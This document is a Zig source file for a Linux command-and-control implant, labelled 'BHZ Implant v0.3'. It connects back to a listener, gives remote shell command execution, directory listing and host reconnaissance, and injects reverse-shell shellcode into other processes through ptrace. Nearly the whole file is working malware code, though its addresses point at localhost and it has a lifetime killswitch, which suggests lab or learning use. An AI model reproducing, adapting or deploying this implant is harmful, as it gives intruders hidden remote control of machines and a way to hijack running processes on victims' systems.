const std = @import("std");
const linux = std.os.linux;

const migrate_shellcode = [_]u8{
    // socket(AF_INET, SOCK_STREAM, 0)
    0x48, 0x31, 0xf6, // xor rsi, rsi
    0x48, 0xf7, 0xe6, // mul rsi (rax=0, rdx=0)
    0x48, 0xff, 0xc6, // inc rsi (SOCK_STREAM=1)
    0x6a, 0x02, // push 2
    0x5f, // pop rdi (AF_INET=2)
    0xb0, 0x29, // mov al, 41 (socket)
    0x0f, 0x05, // syscall
    0x49, 0x89, 0xc4, // mov r12, rax (save sock)

    // connect(sock, &addr, 16)
    0x52, // push rdx (0 padding)
    0x52, // push rdx (0 padding)
    0xc7, 0x04, 0x24, 0x7f, 0x00, 0x00, 0x01, // mov dword [rsp], 127.0.0.1
    0x66, 0x68, 0x11, 0x5d, // push word 0x5d11 (port 4445)
    0x66, 0x6a, 0x02, // push word 2 (AF_INET)
    0x48, 0x89, 0xe6, // mov rsi, rsp
    0x6a, 0x10, // push 16
    0x5a, // pop rdx
    0x4c, 0x89, 0xe7, // mov rdi, r12
    0x6a, 0x2a, // push 42
    0x58, // pop rax (connect)
    0x0f, 0x05, // syscall

    // dup2(sock, 0)
    0x4c, 0x89, 0xe7, // mov rdi, r12
    0x48, 0x31, 0xf6, // xor rsi, rsi (0=stdin)
    0x6a, 0x21, // push 33
    0x58, // pop rax (dup2)
    0x0f, 0x05, // syscall

    // dup2(sock, 1)
    0x48, 0xff, 0xc6, // inc rsi (1=stdout)
    0x6a, 0x21, // push 33
    0x58, // pop rax
    0x0f, 0x05, // syscall

    // dup2(sock, 2)
    0x48, 0xff, 0xc6, // inc rsi (2=stderr)
    0x6a, 0x21, // push 33
    0x58, // pop rax
    0x0f, 0x05, // syscall

    // execve("/bin/sh", ["/bin/sh", NULL], NULL)
    0x48, 0x31, 0xd2, // xor rdx, rdx
    0x52, // push rdx (null term)
    0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, // movabs rdi, "/bin/sh\0"
    0x57, // push rdi
    0x48, 0x89, 0xe7, // mov rdi, rsp
    0x52, // push rdx (NULL)
    0x57, // push rdi
    0x48, 0x89, 0xe6, // mov rsi, rsp
    0x6a, 0x3b, // push 59
    0x58, // pop rax (execve)
    0x0f, 0x05, // syscall

    0xcc, // int3 (fallback)
};

const C2_ADDR = [4]u8{ 127, 0, 0, 1 };
const C2_PORT: u16 = 4444;

const AT_FDCWD: u64 = @bitCast(@as(i64, -100));
const O_RDONLY: u64 = 0;
const O_DIRECTORY: u64 = 0o200000;

const CLOCK_MONOTIC: u64 = 1;
const MAX_LIFETIME: u64 = 1800;

const PTRACE_ATTACH: u64 = 16;
const PTRACE_DETACH: u64 = 17;
const PTRACE_GETREGS: u64 = 12;
const PTRACE_SETREGS: u64 = 13;
const PTRACE_POKETEXT: u64 = 4;
const PTRACE_PEEKTEXT: u64 = 1;
const PTRACE_CONT: u64 = 7;

const UserRegs = extern struct {
    r15: u64,
    r14: u64,
    r13: u64,
    r12: u64,
    rbp: u64,
    rbx: u64,
    r11: u64,
    r10: u64,
    r9: u64,
    r8: u64,
    rax: u64,
    rcx: u64,
    rdx: u64,
    rsi: u64,
    rdi: u64,
    orig_rax: u64,
    rip: u64,
    cs: u64,
    eflags: u64,
    rsp: u64,
    ss: u64,
    fs_base: u64,
    gs_base: u64,
    ds: u64,
    es: u64,
    fs: u64,
    gs: u64,
};

const Timespec = extern struct {
    sec: i64,
    nsec: i64,
};

const LinuxDirent64 = extern struct {
    ino: u64,
    off: u64,
    reclen: u16,
    type: u8,
};

fn checkSyscallReturn(ret: u64) !u64 {
    const signed: i64 = @bitCast(ret);
    if (signed < 0) {
        return error.SyscallFailed;
    }
    return ret;
}

fn rawOpenat(dirfd: u64, path: [*:0]const u8, flags: u64) !u64 {
    return try checkSyscallReturn(linux.syscall4(.openat, dirfd, @intFromPtr(path), flags, 0));
}

fn rawWrite(fd: u64, buf: []const u8) !void {
    var written: usize = 0;
    while (written < buf.len) {
        const n = try checkSyscallReturn(linux.syscall3(.write, fd, @intFromPtr(buf.ptr), buf.len - written));
        written += n;
    }
}

fn rawRead(fd: u64, buf: []const u8) !u64 {
    return try checkSyscallReturn(linux.syscall3(.read, fd, @intFromPtr(buf.ptr), buf.len));
}

fn rawClose(fd: u64) void {
    _ = linux.syscall1(.close, fd);
}

fn rawExit(code: u64) noreturn {
    _ = linux.syscall1(.exit_group, code);
    unreachable;
}

const AF_INET: u64 = 2;
const SOCK_STREAM: u64 = 1;

const sockaddr_in = extern struct {
    family: u16 = 2,
    port: u16,
    addr: [4]u8,
    zero: [8]u8 = @splat(0),
};

fn rawSocket() !u64 {
    return try checkSyscallReturn(linux.syscall3(.socket, AF_INET, SOCK_STREAM, 0));
}

fn rawConnect(fd: u64, addr: *const sockaddr_in) !void {
    _ = try checkSyscallReturn(linux.syscall3(.connect, fd, @intFromPtr(addr), @sizeOf(sockaddr_in)));
}

const Utsname = extern struct {
    sysname: [65]u8,
    nodename: [65]u8,
    release: [65]u8,
    version: [65]u8,
    machine: [65]u8,
    domainname: [65]u8,
};

fn rawGetpid() u64 {
    return linux.syscall0(.getpid);
}

fn rawGetuid() u64 {
    return linux.syscall0(.getuid);
}

fn rawUname(info: *Utsname) !void {
    _ = try checkSyscallReturn(linux.syscall1(.uname, @intFromPtr(info)));
}

fn rawGetcwd(buf: []const u8) !u64 {
    return try checkSyscallReturn(linux.syscall2(.getcwd, @intFromPtr(buf.ptr), buf.len));
}

fn rawFork() !u64 {
    return try checkSyscallReturn(linux.syscall0(.fork));
}

fn rawDup2(old_fd: u64, new_fd: u64) !void {
    _ = try checkSyscallReturn(linux.syscall2(.dup2, old_fd, new_fd));
}

fn rawPipe2(fds: *[2]i32) !void {
    _ = try checkSyscallReturn(linux.syscall2(.pipe2, @intFromPtr(fds), 0));
}

fn rawWait4(pid: u64) !void {
    var status: u32 = 0;
    _ = try checkSyscallReturn(linux.syscall4(.wait4, pid, @intFromPtr(&status), 0, 0));
}

fn rawGetdents64(fd: u64, buf: []const u8) !u64 {
    return try checkSyscallReturn(linux.syscall3(.getdents64, fd, @intFromPtr(buf.ptr), buf.len));
}

fn rawClockGettime(buf: *Timespec) !void {
    _ = try checkSyscallReturn(linux.syscall2(.clock_gettime, CLOCK_MONOTIC, @intFromPtr(buf)));
}

fn rawPtrace(request: u64, pid: u64, addr: u64, data: u64) !u64 {
    return try checkSyscallReturn(linux.syscall4(.ptrace, request, pid, addr, data));
}

fn rawWaitpid(pid: u64) !void {
    var status: u32 = 0;
    _ = try checkSyscallReturn(linux.syscall4(.wait4, pid, @intFromPtr(&status), 0, 0));
}

fn sendStr(fd: u64, str: []const u8) void {
    rawWrite(fd, str) catch {};
}

fn trimRight(buf: []const u8) []const u8 {
    var end: usize = buf.len;
    while (end > 0 and (buf[end - 1] == '\n' or buf[end - 1] == '\r' or buf[end - 1] == ' ')) {
        end -= 1;
    }
    return buf[0..end];
}

fn handleLs(sock: u64, path: []const u8) void {
    var path_buf: [256]u8 = undefined;
    const dir_path: [*:0]const u8 = blk: {
        if (path.len == 0) {
            break :blk ".";
        }
        if (path.len >= path_buf.len) {
            sendStr(sock, "[!] Path too long\n");
            return;
        }
        @memcpy(path_buf[0..path.len], path);
        path_buf[path.len] = 0;
        break :blk @ptrCast(&path_buf);
    };

    const fd = rawOpenat(AT_FDCWD, dir_path, O_RDONLY | O_DIRECTORY) catch {
        sendStr(sock, "[!] Could not open directory\n");
        return;
    };
    var buf: [4096]u8 = undefined;
    while (true) {
        const n = rawGetdents64(fd, &buf) catch break;
        if (n == 0) break;

        var offset: usize = 0;
        while (offset < n) {
            const reclen = std.mem.readInt(u16, buf[offset + 16 ..][0..2], .little);
            const entry_type = buf[offset + 18];
            const name_ptr: [*:0]const u8 = @ptrCast(buf[offset + 19 ..].ptr);
            const name = std.mem.sliceTo(name_ptr, 0);

            if (!std.mem.eql(u8, name, ".") and !std.mem.eql(u8, name, "..")) {
                const type_char: u8 = switch (entry_type) {
                    4 => 'd',
                    8 => '-',
                    10 => 'l',
                    else => '?',
                };
                const prefix = [_]u8{ type_char, ' ' };
                sendStr(sock, &prefix);
                sendStr(sock, name);
                sendStr(sock, "\n");
            }

            offset += reclen;
        }
    }
    rawClose(fd);
}

fn handleMaps(sock: u64) void {
    const fd = rawOpenat(AT_FDCWD, "/proc/self/maps", O_RDONLY) catch {
        sendStr(sock, "[!] Could not open /proc/self/maps");
        return;
    };

    var buf: [4096]u8 = undefined;
    while (true) {
        const n = rawRead(fd, &buf) catch break;
        if (n == 0) break;
        sendStr(sock, buf[0..n]);
    }
    rawClose(fd);
}

fn handlePWD(sock: u64) void {
    var buf: [256]u8 = undefined;
    const len = rawGetcwd(&buf) catch {
        sendStr(sock, "[!] getcwd failed\n");
        return;
    };
    if (len > 1) {
        sendStr(sock, buf[0 .. len - 1]);
    }
    sendStr(sock, "\n");
}

fn handleInfo(sock: u64) void {
    const pid = rawGetpid();
    const uid = rawGetuid();

    var uname_info: Utsname = undefined;
    rawUname(&uname_info) catch {
        sendStr(sock, "[!] uname failed\n");
        return;
    };

    var cwd_buf: [256]u8 = undefined;
    const cwd_len = rawGetcwd(&cwd_buf) catch 0;

    var out: [512]u8 = undefined;
    const result = std.fmt.bufPrint(&out, "[*] SYSTEM INFO:\nPID: {d}\nUID: {d}\nHostname: {s}\nKernel: {s} {s}\nArch: {s}\nCWD: {s}", .{ pid, uid, std.mem.sliceTo(&uname_info.nodename, 0), std.mem.sliceTo(&uname_info.sysname, 0), std.mem.sliceTo(&uname_info.release, 0), std.mem.sliceTo(&uname_info.machine, 0), if (cwd_len > 1) cwd_buf[0..cwd_len] else "unknown" }) catch return;

    sendStr(sock, result);
}

fn handleExec(sock: u64, cmd: []const u8) void {
    var pipe_fds: [2]i32 = undefined;
    rawPipe2(&pipe_fds) catch {
        sendStr(sock, "[!] pipe2 failed");
        return;
    };

    const child_pid = rawFork() catch {
        sendStr(sock, "[!] fork failed\n");
        return;
    };

    if (child_pid == 0) {
        rawClose(@intCast(pipe_fds[0]));
        rawDup2(@intCast(pipe_fds[1]), 1) catch rawExit(1);
        rawDup2(@intCast(pipe_fds[1]), 2) catch rawExit(1);
        rawClose(@intCast(pipe_fds[1]));

        var cmd_buf: [512]u8 = undefined;
        if (cmd.len > cmd_buf.len) rawExit(1);
        @memcpy(cmd_buf[0..cmd.len], cmd);
        cmd_buf[cmd.len] = 0;

        const sh: [*:0]const u8 = "/bin/sh";
        const flag: [*:0]const u8 = "-c";
        const cmd_z: [*:0]const u8 = @ptrCast(&cmd_buf);
        const argv = [_]?[*:0]const u8{ sh, flag, cmd_z, null };
        const envp = [_]?[*:0]const u8{null};

        _ = linux.syscall3(.execve, @intFromPtr(sh), @intFromPtr(&argv), @intFromPtr(&envp));
        rawExit(1);
    }

    rawClose(@intCast(pipe_fds[1]));
    var buf: [4096]u8 = undefined;
    while (true) {
        const n = rawRead(@intCast(pipe_fds[0]), &buf) catch break;
        if (n == 0) break;
        sendStr(sock, buf[0..n]);
    }

    rawClose(@intCast(pipe_fds[0]));
    rawWait4(child_pid) catch {};
}

fn handleMigrate(sock: u64, arg: []const u8) void {
    const target_pid = std.fmt.parseInt(u64, arg, 10) catch {
        sendStr(sock, "[!] Usage: migrate <pid>\n");
        return;
    };

    sendStr(sock, "[*] Attaching to target...\n");
    _ = rawPtrace(PTRACE_ATTACH, target_pid, 0, 0) catch {
        sendStr(sock, "[!] PTRACE_ATTACH failed (need root?)\n");
        return;
    };
    rawWaitpid(target_pid) catch {
        sendStr(sock, "[!] waitpid failed\n");
        return;
    };
    sendStr(sock, "[+] Attached\n");

    var orig_regs: UserRegs = undefined;
    _ = rawPtrace(PTRACE_GETREGS, target_pid, 0, @intFromPtr(&orig_regs)) catch {
        sendStr(sock, "[!] GETREGS failed\n");
        _ = rawPtrace(PTRACE_DETACH, target_pid, 0, 0) catch {};
        return;
    };

    const inject_addr = orig_regs.rip;
    const sc = &migrate_shellcode;
    const word_count = (sc.len + 7) / 8;

    var i: usize = 0;
    while (i < word_count) : (i += 1) {
        var word: u64 = undefined;

        if (i == word_count - 1 and sc.len % 8 != 0) {
            var peek: u64 = undefined;
            _ = rawPtrace(PTRACE_PEEKTEXT, target_pid, inject_addr + i * 8, @intFromPtr(&peek)) catch {
                sendStr(sock, "[!] PEEKTEXT failed\n");
                _ = rawPtrace(PTRACE_DETACH, target_pid, 0, 0) catch {};
                return;
            };
            var peek_bytes: [8]u8 = @bitCast(peek);
            const remaining = sc.len - i * 8;
            @memcpy(peek_bytes[0..remaining], sc[i * 8 ..][0..remaining]);
            word = @bitCast(peek_bytes);
        } else {
            word = @bitCast(sc[i * 8 ..][0..8].*);
        }

        _ = rawPtrace(PTRACE_POKETEXT, target_pid, inject_addr + i * 8, word) catch {
            sendStr(sock, "[!] POKETEXT failed\n");
            _ = rawPtrace(PTRACE_DETACH, target_pid, 0, 0) catch {};
            return;
        };
    }
    sendStr(sock, "[+] Shellcode injected.\n");

    var new_regs = orig_regs;
    new_regs.rip = inject_addr;
    new_regs.orig_rax = @bitCast(@as(i64, -1));
    _ = rawPtrace(PTRACE_SETREGS, target_pid, 0, @intFromPtr(&new_regs)) catch {
        sendStr(sock, "[!] SETREGS failed\n");
        _ = rawPtrace(PTRACE_DETACH, target_pid, 0, 0) catch {};
        return;
    };

    _ = rawPtrace(PTRACE_DETACH, target_pid, 0, 0) catch {
        sendStr(sock, "[!] DETACH failed\n");
        return;
    };

    sendStr(sock, "[+] Detached. Shellcode running freely\n");
    sendStr(sock, "[+] Check listener on port 4445\n");
}

pub fn main(_: std.process.Init) !void {
    const sock = try rawSocket();
    const addr = sockaddr_in{
        .port = @byteSwap(C2_PORT),
        .addr = C2_ADDR,
    };

    rawConnect(sock, &addr) catch {
        std.debug.print("[!] Could not connect to C2 at {d}.{d}.{d}.{d}:{d}\n", .{ C2_ADDR[0], C2_ADDR[1], C2_ADDR[2], C2_ADDR[3], C2_PORT });
        return error.SyscallFailed;
    };

    try rawWrite(sock, "[*] BHZ Implant v0.3\n[*] Connected.\n[*] Commands: info, maps, pwd, ls [path], exec <cmd>, migrate <pid>, exit\n");

    var start_time: Timespec = undefined;
    try rawClockGettime(&start_time);

    var buf: [1024]u8 = undefined;
    while (true) {
        var now: Timespec = undefined;
        rawClockGettime(&now) catch break;
        const elapsed: u64 = @intCast(now.sec - start_time.sec);
        if (elapsed >= MAX_LIFETIME) {
            sendStr(sock, "[*] Killswitch: max lifetime reached. Bye\n");
            break;
        }
        try rawWrite(sock, "bhz> ");

        const n = rawRead(sock, &buf) catch break;
        if (n == 0) break;

        const cmd = trimRight(buf[0..n]);
        if (cmd.len == 0) continue;

        if (std.mem.eql(u8, cmd, "exit")) {
            sendStr(sock, "[*] Exiting...\n");
            break;
        } else if (std.mem.eql(u8, cmd, "info")) {
            handleInfo(sock);
        } else if (std.mem.eql(u8, cmd, "maps")) {
            handleMaps(sock);
        } else if (std.mem.eql(u8, cmd, "pwd")) {
            handlePWD(sock);
        } else if (cmd.len > 8 and std.mem.eql(u8, cmd[0..8], "migrate ")) {
            handleMigrate(sock, cmd[8..]);
        } else if (cmd.len >= 2 and std.mem.eql(u8, cmd[0..2], "ls ")) {
            const arg = if (cmd.len > 3) cmd[3..] else "";
            handleLs(sock, arg);
        } else if (cmd.len > 5 and std.mem.eql(u8, cmd[0..5], "exec ")) {
            handleExec(sock, cmd[5..]);
        } else {
            sendStr(sock, "[!] Unknown command. Try: info, maps, pwd, ls [path], exec <cmd>, migrate <pid> exit\n");
        }
    }

    rawClose(sock);
}
